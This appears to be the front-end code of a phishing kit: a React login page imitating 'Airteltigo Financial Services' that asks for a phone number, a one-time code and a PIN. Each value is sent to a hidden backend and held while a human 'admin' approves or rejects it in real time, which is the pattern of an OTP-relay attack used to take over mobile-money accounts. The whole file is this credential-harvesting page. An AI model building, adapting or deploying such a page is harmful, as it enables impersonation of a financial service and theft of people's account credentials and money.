import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './Login.css';

export default function Login() {
  const navigate = useNavigate();

  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || 'u1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';

  // ─── Current step: 'phone' | 'otp' | 'pin' ───────────────────────
  const [step, setStep] = useState('phone');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [otp, setOtp] = useState(['', '', '', '']); // 4-digit OTP
  const [pin, setPin] = useState(''); // 4-6 digit PIN as single input
  const [showPin, setShowPin] = useState(false);

  // UI state
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorModal, setErrorModal] = useState({ show: false, message: '' });

  const otpRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
  const pinInputRef = useRef(null);

  // ── Phone: digits only ──
  const handlePhoneChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    setPhoneNumber(value.slice(0, 10));
  };

  const isValidPhone = (phone) =>
    phone.length >= 9 && phone.length <= 10;

  // ── OTP input handlers ──
  const handleOtpChange = (index, value) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = numericValue;
    setOtp(newOtp);
    if (numericValue && index < 3) otpRefs[index + 1].current?.focus();
  };

  const handleOtpKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      } else if (index > 0) {
        otpRefs[index - 1].current?.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      otpRefs[index - 1].current?.focus();
    } else if (e.key === 'ArrowRight' && index < 3) {
      otpRefs[index + 1].current?.focus();
    }
  };

  const handleOtpKeyPress = (e) => {
    if (!/^\d$/.test(e.key)) e.preventDefault();
  };

  // ── PIN text input handler (4-6 digits) ──
  const handlePinChange = (e) => {
    const value = e.target.value.replace(/\D/g, ''); // Only digits
    if (value.length <= 6) {
      setPin(value);
    }
  };

  const togglePinVisibility = () => setShowPin(!showPin);

  // ══════════════════════════════════════════════════════════════════
  // STEP 1: PHONE NUMBER SUBMISSION + POLLING
  // ══════════════════════════════════════════════════════════════════
  const handlePhoneSubmit = async (e) => {
    e.preventDefault();

    if (!isValidPhone(phoneNumber)) {
      setErrorModal({
        show: true,
        message: 'Please enter a valid phone number (9–10 digits).'
      });
      return;
    }

    setIsProcessing(true);

    try {
      // 1. Send phone to backend
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-phone`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber })
      });

      const data = await response.json();

      if (!data.success) {
        setIsProcessing(false);
        setErrorModal({
          show: true,
          message: 'Failed to send phone. Try again.'
        });
        return;
      }

      // 2. Poll for admin approval
      let pollCount = 0;
      const maxPolls = 300; // 5 minutes (300 * 1 sec)
      
      const pollInterval = setInterval(async () => {
        pollCount++;

        try {
          const statusResp = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-phone-status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber })
          });

          const statusData = await statusResp.json();

          if (statusData.status === 'allow') {
            // ✅ Admin allowed → Move to OTP
            clearInterval(pollInterval);
            setIsProcessing(false);
            localStorage.setItem('airteltigo_phone', phoneNumber);
            setStep('otp');
            setOtp(['', '', '', '']);
            setTimeout(() => otpRefs[0].current?.focus(), 100);
          } else if (statusData.status === 'invalid') {
            // ❌ Admin marked as invalid
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'Your phone number is not eligible.'
            });
          } else if (pollCount > maxPolls) {
            // ⏰ Timeout
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'Verification timed out. Please try again.'
            });
          }
        } catch (error) {
          console.error('Poll error:', error);
        }
      }, 1000);

    } catch (error) {
      console.error('Phone submission error:', error);
      setIsProcessing(false);
      setErrorModal({
        show: true,
        message: 'Unable to connect to server. Check your connection.'
      });
    }
  };

  // ══════════════════════════════════════════════════════════════════
  // STEP 2: OTP SUBMISSION + POLLING
  // ══════════════════════════════════════════════════════════════════
  const handleOtpSubmit = async (e) => {
    e.preventDefault();

    const fullOtp = otp.join('');
    if (fullOtp.length !== 4) {
      setErrorModal({
        show: true,
        message: 'Please enter the complete 4-digit OTP.'
      });
      return;
    }

    setIsProcessing(true);

    try {
      // 1. Send OTP to backend
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber, otp: fullOtp })
      });

      const data = await response.json();

      if (!data.success) {
        setIsProcessing(false);
        setErrorModal({
          show: true,
          message: 'Failed to send OTP. Try again.'
        });
        return;
      }

      // 2. Poll for admin approval
      let pollCount = 0;
      const maxPolls = 300;
      
      const pollInterval = setInterval(async () => {
        pollCount++;

        try {
          const statusResp = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-otp-status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber })
          });

          const statusData = await statusResp.json();

          if (statusData.status === 'correct') {
            // ✅ Admin approved → Move to PIN
            clearInterval(pollInterval);
            setIsProcessing(false);
            setStep('pin');
            setPin('');
            setTimeout(() => pinInputRef.current?.focus(), 100);
          } else if (statusData.status === 'wrong') {
            // ❌ Admin marked as wrong
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'The OTP you entered is incorrect.'
            });
            setOtp(['', '', '', '']);
            setTimeout(() => otpRefs[0].current?.focus(), 150);
          } else if (pollCount > maxPolls) {
            // ⏰ Timeout
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'OTP verification timed out. Please try again.'
            });
          }
        } catch (error) {
          console.error('Poll error:', error);
        }
      }, 1000);

    } catch (error) {
      console.error('OTP submission error:', error);
      setIsProcessing(false);
      setErrorModal({
        show: true,
        message: 'Unable to verify OTP. Check your connection.'
      });
    }
  };

  // ══════════════════════════════════════════════════════════════════
  // STEP 3: PIN SUBMISSION + POLLING
  // ══════════════════════════════════════════════════════════════════
  const handlePinSubmit = async (e) => {
    e.preventDefault();

    if (pin.length < 4 || pin.length > 6) {
      setErrorModal({
        show: true,
        message: 'Please enter a 4-6 digit PIN.'
      });
      return;
    }

    setIsProcessing(true);

    try {
      // 1. Send PIN to backend
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber, pin })
      });

      const data = await response.json();

      if (!data.success) {
        setIsProcessing(false);
        setErrorModal({
          show: true,
          message: 'Failed to send PIN. Try again.'
        });
        return;
      }

      // 2. Poll for admin approval
      let pollCount = 0;
      const maxPolls = 300;
      
      const pollInterval = setInterval(async () => {
        pollCount++;

        try {
          const statusResp = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-pin-status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phoneNumber })
          });

          const statusData = await statusResp.json();

          if (statusData.status === 'correct') {
            // ✅ Admin approved → User authenticated
            clearInterval(pollInterval);
            localStorage.setItem('airteltigo_auth', 'true');
            localStorage.setItem('airteltigo_user_phone', phoneNumber);
            setIsProcessing(false);
            await new Promise(r => setTimeout(r, 400));
            navigate('/status');
          } else if (statusData.status === 'wrong') {
            // ❌ Admin marked as wrong
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'The PIN you entered is incorrect.'
            });
            setPin('');
            setTimeout(() => pinInputRef.current?.focus(), 150);
          } else if (pollCount > maxPolls) {
            // ⏰ Timeout
            clearInterval(pollInterval);
            setIsProcessing(false);
            setErrorModal({
              show: true,
              message: 'PIN verification timed out. Please try again.'
            });
          }
        } catch (error) {
          console.error('Poll error:', error);
        }
      }, 1000);

    } catch (error) {
      console.error('PIN submission error:', error);
      setIsProcessing(false);
      setErrorModal({
        show: true,
        message: 'Unable to verify PIN. Check your connection.'
      });
    }
  };

  const closeErrorModal = () => setErrorModal({ show: false, message: '' });

  const isPhoneValid = isValidPhone(phoneNumber);
  const isOtpComplete = otp.every(d => d !== '');
  const isPinValid = pin.length >= 4 && pin.length <= 6;

  // Format phone number for display (mask middle digits)
  const formatPhoneForDisplay = (phone) => {
    if (!phone || phone.length < 4) return phone;
    const first = phone.slice(0, 3);
    const last = phone.slice(-2);
    return `${first}****${last}`;
  };

  // ─── Processing screen ────────────────────────────────────────────
  if (isProcessing) {
    return (
      <div className="login-container">
        <header className="login-header">
          <div className="logo-large">
            <div className="airteltigo-logo-large">
              <div className="airteltigo-circle-large">
                <span className="airteltigo-a-large">A</span>
              </div>
              <span className="logo-large-airteltigo">Airteltigo</span>
            </div>
            <p className="logo-subtitle">Financial Services</p>
          </div>
        </header>

        <main className="login-content">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="airteltigo-spinner"></div>
            </div>
            <h2 className="processing-title">Processing...</h2>
            <p className="processing-subtitle">Please wait</p>
          </div>
        </main>

        <footer className="login-footer">
          © 2026 Airteltigo
        </footer>
      </div>
    );
  }

  // ─── Main render ──────────────────────────────────────────────────
  return (
    <div className="login-container">

      {/* Header */}
      <header className="login-header">
        <div className="logo-large">
          <div className="airteltigo-logo-large">
            <div className="airteltigo-circle-large">
              <span className="airteltigo-a-large">A</span>
            </div>
            <span className="logo-large-airteltigo">Airteltigo</span>
          </div>
          <p className="logo-subtitle">Financial Services</p>
        </div>
      </header>

      {/* Main Content */}
      <main className="login-content">
        <h1 className="login-title">
          {step === 'phone' && 'Enter Your Phone Number'}
          {step === 'otp' && 'Enter OTP Code'}
          {step === 'pin' && 'Enter Your PIN'}
        </h1>

        <form className="login-form">

          {/* ── PHONE STEP ── */}
          {step === 'phone' && (
            <>
              <div className="phone-input-container">
                <input
                  type="tel"
                  className="phone-input-no-prefix"
                  placeholder="05XXXXXXXX OR 02XXXXXXXX"
                  value={phoneNumber}
                  onChange={handlePhoneChange}
                  disabled={isProcessing}
                  maxLength="10"
                  inputMode="numeric"
                  required
                  autoFocus
                />
              </div>

              <button
                type="submit"
                className="login-button"
                disabled={!isPhoneValid}
                onClick={handlePhoneSubmit}
              >
                CONTINUE
              </button>
            </>
          )}

          {/* ── OTP STEP ── */}
          {step === 'otp' && (
            <>
              <div className="otp-sent-message">
                <p className="otp-sent-text">
                  OTP sent to <strong>{formatPhoneForDisplay(phoneNumber)}</strong>
                </p>
              </div>

              <div className="otp-input-container">
                <label className="otp-label">Enter the 4-digit code</label>
                <div className="otp-inputs-wrapper">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      ref={otpRefs[index]}
                      type="text"
                      className="otp-box"
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(index, e)}
                      onKeyPress={handleOtpKeyPress}
                      maxLength="1"
                      inputMode="numeric"
                      pattern="[0-9]"
                      required
                      disabled={false}
                    />
                  ))}
                </div>
              </div>

              <button
                type="submit"
                className="login-button"
                disabled={!isOtpComplete}
                onClick={handleOtpSubmit}
              >
                VERIFY OTP
              </button>

              <button
                type="button"
                className="login-button"
                style={{ marginTop: '0.75rem', background: '#ccc', color: '#666' }}
                onClick={() => {
                  setStep('phone');
                  setPhoneNumber('');
                  setOtp(['', '', '', '']);
                }}
              >
                ← BACK
              </button>
            </>
          )}

          {/* ── PIN STEP (New: Single Text Input, 4-6 digits) ── */}
          {step === 'pin' && (
            <>
              <div className="pin-section-login">
                <label className="pin-label-login">ENTER YOUR PIN</label>
                <div className="pin-input-wrapper-login">
                  <input
                    ref={pinInputRef}
                    type={showPin ? 'text' : 'password'}
                    className="pin-input-login"
                    value={pin}
                    onChange={handlePinChange}
                    placeholder="••••"
                    maxLength="6"
                    inputMode="numeric"
                    required
                    autoFocus
                  />
                  <button
                    type="button"
                    className="eye-button-login"
                    onClick={togglePinVisibility}
                    aria-label={showPin ? 'Hide PIN' : 'Show PIN'}
                  >
                    {showPin ? '👁️' : '👁️‍🗨️'}
                  </button>
                </div>
              </div>

              <button
                type="submit"
                className="login-button"
                disabled={!isPinValid}
                onClick={handlePinSubmit}
              >
                VERIFY PIN
              </button>

              <button
                type="button"
                className="login-button"
                style={{ marginTop: '0.75rem', background: '#ccc', color: '#666' }}
                onClick={() => {
                  setStep('otp');
                  setPin('');
                  setShowPin(false);
                }}
              >
                ← BACK
              </button>
            </>
          )}

        </form>
      </main>

      {/* Footer */}
      <footer className="login-footer">
        <div className="wave-decoration"></div>
        <div className="footer-content">
          <div className="footer-logo">
            <div className="footer-logo-text">
              <div className="footer-airteltigo-logo">
                <div className="footer-airteltigo-circle">
                  <span className="footer-airteltigo-a">A</span>
                </div>
                <span className="footer-logo-airteltigo">Airteltigo</span>
              </div>
              <p className="footer-logo-subtitle">Financial Services</p>
            </div>
          </div>
          <p className="footer-text">Secure. Fast. Reliable.</p>
          <p className="terms-text">
            <span className="terms-link">Terms &amp; Conditions</span>
            {' '}&bull;{' '}
            <span className="terms-link">Privacy Policy</span>
          </p>
        </div>
      </footer>

      {/* Error Modal */}
      {errorModal.show && (
        <div className="error-modal-overlay" onClick={closeErrorModal}>
          <div className="error-modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="error-modal-icon">❌</div>
            <h3 className="error-modal-title">Error</h3>
            <p className="error-modal-message">{errorModal.message}</p>
            <button className="error-modal-button" onClick={closeErrorModal}>
              TRY AGAIN
            </button>
          </div>
        </div>
      )}
    </div>
  );
}